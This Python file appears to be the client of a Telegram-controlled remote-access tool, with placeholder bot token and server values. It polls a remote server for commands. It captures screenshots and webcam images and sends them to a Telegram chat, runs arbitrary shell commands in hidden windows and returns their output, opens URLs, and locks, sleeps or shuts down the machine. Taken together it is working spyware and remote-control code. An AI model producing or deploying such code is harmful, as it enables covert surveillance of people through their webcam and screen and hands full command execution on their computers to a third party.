import cv2
import pyautogui
import requests
import io
import os
import sys
import time
import subprocess
import platform
import psutil
from datetime import datetime

BOT_TOKEN   = "PLACEHOLDER_TOKEN"
CHAT_ID     = "PLACEHOLDER_CHATID"
PC_NAME     = "PLACEHOLDER_PCNAME"
SERVER_URL  = "PLACEHOLDER_SERVER"

BASE_TG = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Прихований запуск команд (без консолі)
def run_hidden(cmd: str) -> None:
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen(cmd, shell=True, startupinfo=si,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def send_message(text: str, parse_mode="Markdown") -> None:
    requests.post(f"{BASE_TG}/sendMessage", json={
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": parse_mode,
    }, timeout=10)


def send_photo_tg(image_bytes: bytes, caption: str = "") -> None:
    requests.post(f"{BASE_TG}/sendPhoto", data={
        "chat_id": CHAT_ID, "caption": caption
    }, files={"photo": ("photo.jpg", image_bytes, "image/jpeg")}, timeout=15)


def poll_server():
    try:
        r = requests.get(f"{SERVER_URL}/poll/{PC_NAME}", timeout=5)
        return r.json().get("task")
    except Exception:
        return None


def do_screenshot() -> bytes:
    buf = io.BytesIO()
    pyautogui.screenshot().save(buf, format="JPEG", quality=85)
    return buf.getvalue()


def do_webcam() -> bytes | None:
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return None
    for _ in range(5):
        cam.read()
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return None
    ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
    return bytes(buf) if ok else None


def do_sysinfo() -> str:
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("/")
    uptime_sec = int(time.time() - psutil.boot_time())
    h, m = divmod(uptime_sec // 60, 60)
    lines = [
        f"*PC:* `{PC_NAME}`",
        f"*OS:* {platform.system()} {platform.release()}",
        f"*Uptime:* {h}h {m}m",
        f"*CPU:* {cpu}%",
        f"*RAM:* {ram.used // 1024**2} / {ram.total // 1024**2} MB ({ram.percent}%)",
        f"*Disk:* {disk.used // 1024**3} / {disk.total // 1024**3} GB ({disk.percent}%)",
    ]
    top = sorted(psutil.process_iter(["name", "cpu_percent"]),
                 key=lambda p: p.info["cpu_percent"] or 0, reverse=True)[:5]
    lines.append("\n*Top processes:*")
    for p in top:
        lines.append(f"  - {p.info['name']} {p.info['cpu_percent']}%")
    return "\n".join(lines)


def volume_change(delta: int) -> str:
    key = "175" if delta > 0 else "174"
    run_hidden(f'powershell -c "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]{key})"')
    return f"[{PC_NAME}] {'volume +10%' if delta > 0 else 'volume -10%'}"


def volume_mute() -> str:
    run_hidden('powershell -c "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys([char]173)"')
    return f"[{PC_NAME}] Muted"


def lock_screen() -> str:
    run_hidden("rundll32.exe user32.dll,LockWorkStation")
    return f"[{PC_NAME}] Locked"


def run_terminal(cmd: str) -> str:
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=10, startupinfo=si
        )
        output = result.stdout.strip() or result.stderr.strip() or "(no output)"
        return f"[{PC_NAME}] `{cmd}`\n```\n{output[:3000]}\n```"
    except subprocess.TimeoutExpired:
        return f"[{PC_NAME}] Timeout"
    except Exception as e:
        return f"[{PC_NAME}] Error: {e}"


def open_url(url: str) -> str:
    if not url.startswith("http"):
        url = "https://" + url
    import webbrowser
    webbrowser.open(url)
    return f"[{PC_NAME}] Opened: {url}"


def power_action(action: str) -> str:
    cmds = {
        "sleep":    "rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
        "restart":  "shutdown /r /t 5",
        "shutdown": "shutdown /s /t 5",
    }
    cmd = cmds.get(action)
    if cmd:
        run_hidden(cmd)
    return f"[{PC_NAME}] {action} done"


def handle(cmd: str, args: str) -> None:
    now = datetime.now().strftime("%H:%M:%S")
    if cmd == "/screenshot":
        send_photo_tg(do_screenshot(), f"[{PC_NAME}] Screenshot {now}")
    elif cmd == "/webcam":
        data = do_webcam()
        if data:
            send_photo_tg(data, f"[{PC_NAME}] Webcam {now}")
        else:
            send_message(f"[{PC_NAME}] Webcam not found")
    elif cmd == "/sysinfo":
        send_message(do_sysinfo())
    elif cmd == "/volume_up":
        send_message(volume_change(+10))
    elif cmd == "/volume_down":
        send_message(volume_change(-10))
    elif cmd == "/mute":
        send_message(volume_mute())
    elif cmd == "/run":
        send_message(run_terminal(args) if args else f"Usage: /run {PC_NAME} ipconfig")
    elif cmd == "/open":
        send_message(open_url(args) if args else f"Usage: /open {PC_NAME} google.com")
    elif cmd == "/lock":
        send_message(lock_screen())
    elif cmd == "/sleep":
        send_message(f"[{PC_NAME}] Sleeping...")
        power_action("sleep")
    elif cmd == "/restart":
        send_message(f"[{PC_NAME}] Restarting in 5s...")
        power_action("restart")
    elif cmd == "/shutdown":
        send_message(f"[{PC_NAME}] Shutting down in 5s...")
        power_action("shutdown")
    elif cmd == "/stop":
        send_message(f"[{PC_NAME}] Stopped.")
        sys.exit(0)
    else:
        send_message(f"[{PC_NAME}] Unknown: `{cmd}`")


def main():
    print(f"Client started as [{PC_NAME}]")
    print(f"Server: {SERVER_URL}")
    send_message(f"`{PC_NAME}` online - {datetime.now().strftime('%H:%M:%S')}")
    while True:
        try:
            task = poll_server()
            if task:
                cmd = task.get("cmd", "")
                args = task.get("args", "")
                print(f"CMD: {cmd} args: {args}")
                try:
                    handle(cmd, args)
                except Exception as e:
                    send_message(f"[{PC_NAME}] Error: `{e}`")
        except Exception as e:
            print(f"Poll error: {e}")
        time.sleep(1)


if __name__ == "__main__":
    main()
